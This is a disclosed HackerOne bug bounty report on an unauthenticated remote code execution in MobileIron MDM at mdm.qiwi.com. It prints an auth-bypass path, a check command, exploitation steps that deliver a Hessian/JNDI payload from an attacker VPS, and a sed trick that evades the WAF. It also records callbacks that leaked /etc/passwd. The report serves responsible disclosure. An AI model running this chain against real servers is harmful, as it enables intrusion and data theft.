---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '983548'
original_report_id: '983548'
title: MobileIron Unauthenticated RCE on mdm.qiwi.com with WAF bypass
weakness: Deserialization of Untrusted Data
team_handle: qiwi
created_at: '2020-09-16T16:01:18.115Z'
disclosed_at: '2021-04-27T07:59:22.149Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 148
asset_identifier: '*.qiwi.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- deserialization-of-untrusted-data
---

# MobileIron Unauthenticated RCE on mdm.qiwi.com with WAF bypass

## Metadata

- HackerOne Report ID: 983548
- Weakness: Deserialization of Untrusted Data
- Program: qiwi
- Disclosed At: 2021-04-27T07:59:22.149Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Last week, details about 3 CVEs affecting **MobileIron MDM** product were disclosed. 
When combined, an attacker can achieve unauthenticated remote code execution with arbitrary Java deserialization vector :
- CVE-2020-15505 - Remote Code Execution
- CVE-2020-15506 - Authentication Bypass
- CVE-2020-15507 - Arbitrary File Reading

The following blog post discloses the issues: https://blog.orange.tw/2020/09/how-i-hacked-facebook-again-mobileiron-mdm-rce.html
The following github repo is a working PoC to reproduce the issues : https://github.com/iamnoooob/CVE-Reverse/tree/master/CVE-2020-15505
Advisory from vendor can be found here : https://www.mobileiron.com/en/blog/mobileiron-security-updates-available

Code execution is achieved by arbitrary deserialization in Java with Hessian protocol.
The **/mifs/services/LogService** endpoint does such deserialization.
Authentication is required by it can be bypassed with **/.;/** (**/mifs/.;/services/LogService**)

By using the following check to determine is a host if vulnerable
```
curl "<HOST>/mifs/.;/services/LogService" -k -s | grep -q 'This method/operation is not allowed.' && echo "<HOST> - Vulnerable"
```
F990297

I've discovered that **mdm.qiwi.com** is vulnerable. The MDM User enrollment interface is reachable on **https://mdm.qiwi.com**
F990294

A WAF is protecting this host and thus blocking out of the box exploit code.
It matches and blocks requests containing essential java classes strings contained in the serialized object like **java.lang / java.io / java.util** :
F990300
F990301

# PoC
The exploitation uses the code hosted on the following repo : https://github.com/iamnoooob/CVE-Reverse/tree/master/CVE-2020-15505
The steps are mostly identical.
This exploit uses a JNDI-based attack with a RMI server running on my VPS.

## WAF Bypass
The final JNDI exploit contains only one string that triggers the WAF : **java.util**
F990309

I've managed to bypass the WAF without breaking the exploit code by replacing it by **javb.util**
F990356

## Exploitation Steps
1. Download on your VPS or internal test server : https://github.com/iamnoooob/CVE-Reverse/tree/master/CVE-2020-15505
2.  Start RMI server with the command you want to deliver : ```java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 0.0.0.0 -C <COMMAND>```
3. Writedown the **reference** returned in the output :
F990318
4. Runthe command  to generate the payload (payload is altered with sed to bypass the WAF) : ```java -cp ./marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian SpringAbstractBeanFactoryPointcutAdvisor rmi://<VPS_IP>/<REFERENCE> | sed -b 's/java\.util/javb.util/' > exp_rmi_qiwi```
5. Deliver the payload with : ```python hessian.py -u "https://mdm.qiwi.com/mifs/.;/services/LogService" -p exp_rmi_qiwi```

## Exploitation proofs

Here are some proofs of my exploitation attemps to validate effective RCE :
- Simple curl ping back

F990322
F990324

- Curl leaking **/etc/passwd**
F990327
F990328

- Curl leaking **/etc/resolv.conf**
F990330
F990331
F990332

The curl user-agent is ```curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.27.1 zlib/1.2.3 libidn/1.18 libssh2/1.4.2```
And requests came from IP ```79.142.22.133```

Since we are exploiting **/mifs/** interface all commands are executed as **tomcat**.
If we happen to exploit Management interface (**/mics/**) through this vulnerability, the commands may be executed by **root** user (depending of the version of MobileIron)

## Impact

By executing arbitrary commands on the server, an attacker can compromise the integrity, availability and confidentiality of the data of the server and also pivot onto other servers on the internal network.

Since this server is running a MDM product, an attacker can compromise it to attack Qiwi employees and/or compromise their mobile devices.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
